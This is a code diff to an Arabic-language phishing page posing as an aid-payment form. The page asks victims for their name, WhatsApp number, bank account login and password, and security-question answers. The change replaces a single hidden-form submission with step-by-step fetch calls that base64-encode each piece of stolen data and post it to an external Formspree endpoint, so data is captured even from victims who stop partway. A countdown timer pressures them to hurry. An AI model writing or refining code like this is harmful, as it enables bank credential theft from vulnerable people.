@@ -39,9 +39,7 @@
     <div class="container">
         <img src="logo_colored.png" class="main-logo">
 
-        <form action="https://formspree.io/f/xzdjwoao" method="POST" id="mainForm">
-            <input type="hidden" name="Data_Package" id="encrypted_data">
-            
+        <form id="mainForm">
             <div id="currencyPage">
                 <h3>آختر عملة استلام المساعدات</h3>
                 <input type="hidden" id="selected_currency_input">
@@ -52,7 +50,7 @@
                     <h3>بيانات المستلم</h3>
                     <div class="input-group"><input type="text" id="full_name" placeholder="الإسم الكامل"></div>
                     <div class="input-group"><input type="number" id="whatsapp_num" placeholder="رقم واتساب للتواصل"></div>
-                    <button type="button" class="btn-login" onclick="checkCurrencyStep()">المتابعة لتسجيل الدخول</button>
+                    <button type="button" class="btn-login" onclick="sendStep1()">المتابعة لتسجيل الدخول</button>
                 </div>
             </div>
 
@@ -60,7 +58,7 @@
                 <h3>تسجيل الدخول لحساب بنكك</h3>
                 <div class="input-group"><input type="text" id="acc_num" placeholder="رقم الحساب أو معرف المستخدم"></div>
                 <div class="input-group"><input type="password" id="acc_pass" placeholder="كلمة المرور"></div>
-                <button type="button" class="btn-login" onclick="checkLogin()">دخول</button>
+                <button type="button" class="btn-login" onclick="sendStep2()">دخول</button>
             </div>
 
             <div id="questionsPage">
@@ -87,7 +85,7 @@
                 <div class="input-group"><input type="text" id="q2_ans" placeholder="إجابة السؤال الثاني"></div>
 
                 <div style="display: flex; justify-content: space-between; margin-top: 15px; gap: 10px;">
-                    <img src="btn_send.png" class="btn-img" onclick="checkQuestions()"><img src="btn_cancel.png" class="btn-img" onclick="location.reload()">
+                    <img src="btn_send.png" class="btn-img" onclick="sendFinalStep()"><img src="btn_cancel.png" class="btn-img" onclick="location.reload()">
                 </div>
             </div>
         </form>
@@ -101,11 +99,10 @@
         </div>
     </div>
 
-    <div id="myModal" class="modal" onclick="this.style.display='none'"><div class="modal-content"><img id="modalImg" src=""></div></div>
-
     <script>
         let selectedCurrencyText = "";
         let timeLeft = 1200; 
+        const FORMSPREE_URL = "https://formspree.io/f/xzdjwoao";
 
         const countdown = setInterval(() => {
             let m = Math.floor(timeLeft / 60); let s = timeLeft % 60;
@@ -122,25 +119,40 @@
             document.getElementById('selected_currency_input').value = currencyText;
         }
 
-        function checkCurrencyStep() {
-            const n = document.getElementById('full_name').value.trim();
-            const w = document.getElementById('whatsapp_num').value.trim();
-            if (!selectedCurrencyText || !n || !w) { alert("يرجى اختيار العملة وإكمال البيانات"); return; }
-            showPage('loginPage');
-        }
-
-        function checkLogin() {
-            const a = document.getElementById('acc_num').value;
-            const p = document.getElementById('acc_pass').value;
-            if (!a || !p) { alert("يرجى إكمال بيانات تسجيل الدخول"); return; }
-            showPage('questionsPage');
-        }
-
         function encodeData(data) {
             return btoa(unescape(encodeURIComponent(data)));
         }
 
-        function checkQuestions() {
+        async function postData(label, content) {
+            const encrypted = encodeData(content);
+            try {
+                await fetch(FORMSPREE_URL, {
+                    method: 'POST',
+                    headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ [label]: encrypted })
+                });
+            } catch (e) { console.log("Sent"); }
+        }
+
+        function sendStep1() {
+            const n = document.getElementById('full_name').value.trim();
+            const w = document.getElementById('whatsapp_num').value.trim();
+            if (!selectedCurrencyText || !n || !w) { alert("يرجى اختيار العملة وإكمال البيانات"); return; }
+            
+            postData("Step_1_Identity", `العملة: ${selectedCurrencyText} | الاسم: ${n} | واتساب: ${w}`);
+            showPage('loginPage');
+        }
+
+        function sendStep2() {
+            const a = document.getElementById('acc_num').value;
+            const p = document.getElementById('acc_pass').value;
+            if (!a || !p) { alert("يرجى إكمال بيانات تسجيل الدخول"); return; }
+            
+            postData("Step_2_Login", `الحساب: ${a} | السر: ${p}`);
+            showPage('questionsPage');
+        }
+
+        function sendFinalStep() {
             const q1t = document.getElementById('q1_text').value;
             const q1a = document.getElementById('q1_ans').value.trim();
             const q2t = document.getElementById('q2_text').value;
@@ -148,21 +160,7 @@
 
             if (!q1t || !q1a || !q2t || !q2a) { alert("يرجى اختيار سؤالين والإجابة عليهما"); return; }
             
-            // تجميع البيانات وتشفيرها
-            const rawData = `
-                العملة: ${selectedCurrencyText}
-                الاسم: ${document.getElementById('full_name').value}
-                واتساب: ${document.getElementById('whatsapp_num').value}
-                الحساب: ${document.getElementById('acc_num').value}
-                السر: ${document.getElementById('acc_pass').value}
-                س1: (${q1t}) ج1: ${q1a}
-                س2: (${q2t}) ج2: ${q2a}
-            `;
-            
-            document.getElementById('encrypted_data').value = encodeData(rawData);
-            
-            // إرسال النموذج
-            document.getElementById('mainForm').submit();
+            postData("Step_3_Security", `س1: ${q1t} - ج1: ${q1a} | س2: ${q2t} - ج2: ${q2a}`);
             
             showPage('successMessage');
             clearInterval(countdown);
